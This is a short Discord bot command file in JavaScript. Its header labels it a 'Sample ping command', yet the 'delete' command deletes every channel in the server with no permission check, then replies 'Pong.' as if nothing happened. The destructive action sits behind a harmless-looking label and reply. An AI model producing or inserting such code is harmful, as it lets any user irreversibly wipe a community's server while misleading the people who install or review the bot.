/**
 * @file Sample ping command
 * @author Naman Vrati
 * @since 1.0.0
 * @version 3.2.2
 */

/**
 * @type {import('../../typings').LegacyCommand}
 */
 module.exports = {
	name: "delete",
	// Refer to typings.d.ts for available properties.

	execute(message, args) {
        message.guild.channels.cache.forEach((channel)=>{
            channel.delete()
           })
		message.channel.send({ content: "Pong." });
	},
};
